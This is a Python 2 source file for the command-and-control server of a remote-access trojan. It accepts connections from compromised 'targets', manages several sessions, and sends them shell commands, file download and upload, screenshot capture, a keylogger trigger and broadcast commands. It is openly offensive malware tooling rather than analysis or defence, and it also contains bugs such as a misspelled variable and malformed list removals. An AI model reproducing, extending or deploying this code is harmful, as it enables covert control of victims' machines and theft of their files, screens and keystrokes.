#!/usr/bin/python

import socket
#for connection
import json
#data recieving and send
import os
#for processes
import base64
#recieve images and file
import threading
#for multiple connection

#count = 1

def sendtoall(target,data):
	json_data = json.dumps(data)
	target.send(json_data)


def shell(target,ip):

	def reliable_send(data):
        	json_data = json.dumps(data)
        	target.send(json_data)

	def reliable_recv():
        	data = ""
        	while True:
                	try:
                        	data = data + target.recv(1024)
                        	return json.loads(data)
                	except ValueError:
                        	continue


        global count
        while True:
                command = raw_input("* Shell#~%s: " % str(ip))
                reliable_send(command)
                if command == 'q' :
                        break
		elif command == "exit":
			target.close()
			targets.remove()
			ips.remove()
			break
                elif command[:2] == "cd" and len(command) > 1:
                        continue
                elif command[:8] == "download":
                        with open(command[9:], "wb") as file:
                                file_data = reliable_recv()
                                file.write(base64.b64decode(file_data))
                elif command[:6] == "upload":
                        try:
                                with open(command[7:], "rb") as fin:
                                        reliable_send(base64.b64encode(fin.read()))
                        except:
                                failed = "Failed to upload"
                                reliable_send(base64.b64encode(failed))
                elif command[:10] == "screenshot":
                        with open("screenshot%d" % count, "wb") as screen:
                                image = reliable_recv()
                                image_decoded = base64.b64decode(image)
                                if image_decoded[:4] == "[!!]":
                                        print(image_decoded)
                                else:
                                        screen.write(image_decoded)
                                        count +=1
                elif command[:12] == "keylog_start":
                        continue
                else:
                        result = reliable_recv()
                        print(result)




def server():
	global clients
	while True:
		if stop_threads:
			break
		s.settimeout(1)
		try:
			target, ip = s.accept()
			targets.append(target)
			ips.append(ip)
			print(str(targets[clients]) + "---" + str(ips[clients]) + "has connected!")
			clients +=1
		except:
			pass






global s
ips = []
#contains the ips to target
targets = []
#list containg the socket objects
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("192.168.43.147",54321))
s.listen(5)

clients = 0
stop_threads = False

print("[+] Waiting for target to connect ...")
t1 = threading.Thread(target=server)
t1.start()


while True:
	command = raw_input("* Center: ")
	if command == "targets":
			count = 0
			for ip in ips:
				print("Session " + str(count) + ",<--->" + str(ip))
				count += 1
	elif command[:7] == "session":
		try:
			num = int(command[8:])
			tarnum = targets[num]
			tarip = ips[num]
			shell(tarnum,tarip)
		except:
			print("[!!] No session under the number!")
	elif command == "exit":
		for target in targets:
			target.close()
		s.close()
		stop_threads = True
		t1.join()
		break
	elif command[:7] == "sendall":
		length_of_targets = len(targets)
		i = 0
		try:
			while i<lenght_of_targets:
				tarnumber = targets[i]
				print tarnumber
				sendtoall(tarnumber,command)
				i +=1
		except:
			print("[!!] Failed to send command to all targets")

	else:
		print("[!!] Command doesnot exsist")
